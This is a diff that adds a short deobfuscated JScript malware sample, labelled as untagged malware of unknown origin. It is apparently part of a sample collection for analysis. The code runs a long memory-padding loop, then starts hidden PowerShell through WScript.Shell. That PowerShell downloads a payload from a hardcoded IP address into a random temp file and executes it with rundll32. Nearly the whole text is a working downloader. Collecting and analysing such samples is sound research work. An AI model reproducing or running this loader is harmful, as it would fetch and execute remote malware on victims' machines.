@@ -1,0 +1,10 @@
+/*
+Untagged Malware | Unknown Origins
+Deobfuscated By: Shaxowfall
+*/
+var reserved_memory = "Save";
+for (var overflow_counter = 0; overflow_counter < 3000000; overflow_counter++) {
+  var reserved_memory = reserved_memory.concat("Load");
+}
+var WSHELL = WScript.CreateObject("WScript.Shell");
+var PowerShell = WSHELL.Run("powershell.exe -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'http://80.66.88.146/data/5fb6dd81093a0d6812c17b12f139ce35' -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job\"", 0, false);
